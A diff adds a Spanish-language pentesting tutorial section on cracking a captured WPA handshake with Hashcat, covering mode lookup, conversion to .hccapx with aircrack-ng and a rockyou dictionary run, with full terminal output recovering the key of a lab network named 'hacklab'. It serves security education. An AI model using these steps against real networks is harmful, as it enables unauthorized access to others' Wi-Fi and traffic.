@@ -1966,6 +1966,155 @@ contraseña siempre y cuando esta se encuentre en el diccionario especificado:
 La velocidad de cómputo siempre va a depender de nuestra CPU, pero veremos un par de técnicas más adelante
 para aumentar nuestra velocidad de cómputo, superando las 10 millones de contraseñas por segundo.
 
+#### Fuerza bruta con Hashcat
+
+Ya que **aircrack** no es capaz de tirar por GPU, en caso de que tengáis una GPU como en mi caso:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #nvidia-detect 
+Detected NVIDIA GPUs:
+01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] [10de:1c8d] (rev a1)
+```
+
+Lo mejor es tirar de **Hashcat** para estos casos. Para correr la herramienta, primero necesitamos saber cuál
+es el método numérico correpsondiente a **WPA**:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #hashcat -h | grep -i wpa
+   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
+   2501 | WPA-EAPOL-PMK                                    | Network Protocols
+  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
+  16801 | WPA-PMKID-PMK                                    | Network Protocols
+```
+
+Una vez identificado (**2500**), lo primero que necesitamos hacer es convertir nuestra captura '**.cap**' a un
+archivo de tipo '**.hccapx**', específico para la combinación de Hashcat. Para ello, corremos el parámetro
+'**-j**' de aircrack (esta vez es minúscula):
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #aircrack-ng -j hashcatCapture Captura-01.cap 
+Opening Captura-01.cape wait...
+Read 5110 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening Captura-01.cape wait...
+Read 5110 packets.
+
+1 potential targets
+
+
+
+Building Hashcat (3.60+) file...
+
+[*] ESSID (length: 7): hacklab
+[*] Key version: 2
+[*] BSSID: 20:34:FB:B1:C5:53
+[*] STA: 34:41:5D:46:D1:38
+[*] anonce:
+    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
+    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
+[*] snonce:
+    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
+    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
+[*] Key MIC:
+    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
+[*] eapol:
+    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
+    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
+    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
+    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
+    04 01 00 00 0F AC 02 00 00 
+
+Successfully written to hashcatCapture.hccapx
+
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #ls
+Captura-01.cap  hashcatCapture.hccapx
+```
+
+Ya en posesión de esta captura, iniciamos la fase de cracking haciendo uso de la siguiente sintaxis:
+
+* hashcat -m 2500 -d 1 rockyou.txt --force -w 3
+
+Obteniendo los siguientes resultados en un tiempo récord:
+
+```bash
+┌─[✗]─[root@parrot]─[/usr/share/wordlists]
+└──╼ #hashcat -m 2500 -d 1 hashcatCapture.hccapx rockyou.txt 
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: NVIDIA Corporation
+======================================
+* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU
+
+OpenCL Platform #2: The pocl project
+====================================
+* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Watchdog: Temperature abort trigger set to 90c
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=2500 -D _unroll'
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344386
+* Bytes.....: 139921517
+* Keyspace..: 14344386
+
+ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: WPA-EAPOL-PBKDF2
+Hash.Target......: hacklab (AP:20:34:fb:b1:c5:53 STA:34:41:5d:46:d1:38)
+Time.Started.....: Sun Aug 11 19:12:43 2019 (4 secs)
+Time.Estimated...: Sun Aug 11 19:12:47 2019 (0 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    79177 H/s (7.18ms) @ Accel:128 Loops:64 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 807901/14344386 (5.63%)
+Rejected.........: 439261/807901 (54.37%)
+Restore.Point....: 728207/14344386 (5.08%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 22lehvez33 -> rodnesha
+Hardware.Mon.#1..: Temp: 63c Util: 92% Core:1670MHz Mem:3504MHz Bus:8
+
+```
+
+Recuerda hacer uso del parámetro **-d** para especificar el dispositivo a usar. Si queremos listar la
+contraseña una vez crackeada (aunque también la vemos en el output listado anteriormente), podemos hacer lo
+siguiente:
+
+```bash
+┌─[root@parrot]─[/usr/share/wordlists]
+└──╼ #hashcat --show -m 2500 hashcatCapture.hccapx 
+ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
+```
+
 
 
 
